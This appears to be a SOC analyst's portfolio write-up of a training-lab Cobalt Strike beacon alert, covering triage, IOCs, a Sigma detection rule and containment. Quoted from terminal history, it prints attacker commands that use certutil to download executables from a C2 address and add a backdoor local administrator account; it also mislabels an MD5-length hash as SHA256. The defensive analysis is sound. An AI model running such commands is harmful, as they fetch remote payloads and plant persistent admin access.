
# SOC139 - Meterpreter or Empire Activity (Cobalt Strike Beacon) 
## 🚨 Raw Alert Details
```text
EventID : 78
Event Time : 2021-03-15T14:15:01+03:00
Rule : SOC139 - Meterpreter or Empire Activity
Role : Incident Responder
Alert Type : Malware
Difficulty : Medium
MITRE ATT&CK : T1112, T1204, T1105, T1136.001, T1071.001
Hostname : Alex - HP
IP Address : 172.16.17.55
File Name : cobaltstrike_shellcode.exe
File Hash : 24d99ba5654cdf31141c66fd9417b7e0
File Size : 219.00 KB
EDR Action : Allowed
Trigger Reason : Cobalt Strike / Meterpreter shellcode IOC detected on host.
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / AV / Network IDS
- **Asset Affected:** Alex - HP (172.16.17.55 - Windows 10)
- **Threat Type:** Command and Control (C2) / Cobalt Strike Beacon / Post-Exploitation
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
**Cobalt Strike** is a commercial penetration testing and red teaming framework that is heavily abused by threat actors and APT groups for adversary simulation and command-and-control (C2) operations.

**The Mechanics:** The core component of Cobalt Strike is the **Beacon**. A beacon is a payload designed to execute silently on a compromised host, establish an encrypted or obfuscated connection back to the attacker's Team Server, and provide interactive command execution. Attackers frequently use staging binaries or raw shellcode wrappers (such as `cobaltstrike_shellcode.exe`) to initialize the beacon. Once running, the beacon automatically conducts internal reconnaissance, downloads secondary payloads using native tools (`certutil`), and establishes persistence (such as creating rogue local admin accounts).

## Investigation Steps

### 1. Alert Triage & Hash Enrichment (VirusTotal)
The investigation began by evaluating the suspicious binary flagged by the EDR on host `Alex - HP` (172.16.17.55).
- **File Name:** `cobaltstrike_shellcode.exe`
- **File Hash:** `24d99ba5654cdf31141c66fd9417b7e0`
- **OSINT Verification:** Querying the file hash on VirusTotal returned a decisive **62/68 malicious detections**, explicitly identifying the binary as `cobaltstrike_shellcode.bin`.

<img width="1795" height="239" alt="image" src="https://github.com/user-attachments/assets/a714b196-6e4c-4292-8a37-be61b67efad4" />
<img width="1216" height="514" alt="image" src="https://github.com/user-attachments/assets/2fc03169-8240-4f5a-b062-324c38c471bb" />



### 2. Process Execution & Network C2 Validation
Endpoint and firewall telemetry were correlated to observe active C2 communication.
- **Process Lineage:** The malicious binary executed successfully from the local system, establishing outbound network connections over non-standard ports (e.g., Port 8080) to external IP addresses (`120.79.181.138`, `221.181.185.200`).
- **Firewall Logs:** Confirmed persistent HTTPS/HTTP traffic between the host and the C2 infrastructure.

<img width="1453" height="340" alt="image" src="https://github.com/user-attachments/assets/bde47a43-4cb3-4f0f-8c0b-bd8aea61dfb8" />
<img width="543" height="218" alt="image" src="https://github.com/user-attachments/assets/841258ce-4e74-46a7-831a-88ae1d981a71" />
<img width="544" height="221" alt="image" src="https://github.com/user-attachments/assets/e5d2e734-4fe2-4fc1-9618-71ca4388642f" />



### 3. Post-Exploitation & Ingress Tool Transfer (Terminal History)
Reviewing the EDR Terminal History exposed the attacker's post-exploitation activities following the deployment of the Cobalt Strike beacon:
- **Staging Payloads via Certutil:** The attacker used `certutil.exe` to pull secondary binaries from the C2 server:
  - `certutil.exe -urlcache -f https://221.181.185.200:8080/services.exe C:\Users\Public\services.exe`
  - `certutil.exe -urlcache -f https://221.181.185.200:8080/svohosts.exe C:\Users\Public\svohosts.exe`
- **Persistence (Account Creation):** The attacker escalated privileges and created a backdoor administrative user:
  - `net user alexx Hard2Cr4ck! /add`
  - `net localgroup administrators alexx /add`

<img width="1213" height="574" alt="image" src="https://github.com/user-attachments/assets/6032c34b-ac1e-4dd1-bdc0-cc31a1bfae31" />


## Analysis & Findings
The incident is a confirmed **True Positive**. The host `Alex - HP` executed a Cobalt Strike shellcode binary (`cobaltstrike_shellcode.exe`). Threat intelligence confirms the file hash is universally recognized as malicious. Network logs captured the beacon communicating with external C2 infrastructure, and terminal history confirmed the attacker successfully downloaded staging tools (`certutil`) and created a persistent local administrator account (`alexx`). The endpoint is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Execution** | T1204.002 | User Execution: Malicious File |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols (Cobalt Strike Beacon) |
| **Defense Evasion** | T1105 | Ingress Tool Transfer (`certutil`) |
| **Persistence** | T1136.001 | Create Account: Local Account (`net user alexx /add`) |
| **Privilege Escalation**| T1078 | Valid Accounts / Group Membership Modification |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| File Hash (SHA256) | `24d99ba5654cdf31141c66fd9417b7e0` | Cobalt Strike Shellcode Binary (`cobaltstrike_shellcode.exe`) |
| IP Address | 120.79.181.138 | Cobalt Strike C2 Drop Server IP |
| IP Address | 221.181.185.200 | Secondary C2 / Payload Staging Server |
| Local Account | `alexx` | Rogue administrative user created by attacker |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of Cobalt Strike Beacons and `certutil` staging, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Cobalt Strike Staging via Certutil Download
id: f15f0599-1234-4a5e-994d-70580c5e9f12
status: experimental
description: Detects certutil downloading files from non-standard ports associated with known Cobalt Strike C2 IPs.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    Image: '*\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - ':8080/'
      - ':8443/'
  condition: selection
falsepositives:
  - Legitimate administrative script downloads over alternative ports
level: critical
tags:
  - attack.t1105
  - attack.t1071.001
```

## 🚀 Decision Tree 
1. **Analyze Trigger Reason:** Did an alert fire for Meterpreter, Empire, or Cobalt Strike shellcode execution?
   - If Yes -> Verify file hash against VirusTotal.
2. **Check Threat Intel:** Does the hash return high malicious detections (e.g., >50/70)?
   - *Confirmed 62/68 detections for `cobaltstrike_shellcode.bin`.*
3. **Check Network & Terminal Activity:** Did the host establish outbound connections to external IPs and execute follow-on commands (`certutil`, `net user`)?
   - *Confirmed outbound traffic to C2 IPs and creation of user `alexx`.*
4. **Action:** **Verdict: True Positive - Compromised.** Immediately isolate the endpoint.

## 📝 Playbook Questions & Answers
- **Check If Someone Requested the C2:**
  - *Answer:* Accessed.
  - *Reasoning:* Network and proxy logs confirmed active outbound communication from the infected host to external C2 IP addresses over port 8080/443.
- **Analyze Malware:**
  - *Answer:* Malicious.
  - *Reasoning:* VirusTotal confirmed the binary hash (`24d99ba5...`) belongs to a Cobalt Strike shellcode loader.
- **Check if the malware is quarantined/cleaned:**
  - *Answer:* Not Quarantined.
  - *Reasoning:* The binary was allowed to execute by the EDR initially, establishing an active C2 session and dropping secondary files.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Alex - HP / 172.16.17.55`) was immediately **Isolated** from the network via EDR to sever the active Cobalt Strike beacon connection.
- **Account Remediation:** Flagged the rogue local admin account (`alexx`) for immediate deletion.
- **Why:** Isolating the host stops the attacker from issuing further interactive shell commands, executing scripts, or moving laterally within the domain.

## Recommendations
1. **Endpoint Reimaging:** Because a Cobalt Strike beacon successfully executed and dropped administrative persistence (`alexx`), the host is untrusted and must be wiped and re-imaged.
2. **Network Egress Filtering:** Restrict outbound connections on non-standard ports (such as 8080, 8443, 4444) to authorized proxies only, blocking raw IP-based C2 communications.
3. **Active Directory Audit:** Check Domain Controllers for any Kerberos ticket manipulation (Golden/Silver tickets) or lateral movement attempts originating from IP `172.16.17.55`.


## 🛠️ Skills & Tools Used
- EDR Process & Terminal History Forensics (`certutil`, `net user`)
- Threat Intelligence Correlation (VirusTotal)
- Network C2 Triage (Outbound connection analysis on non-standard ports)
- Incident Containment (Host Isolation)
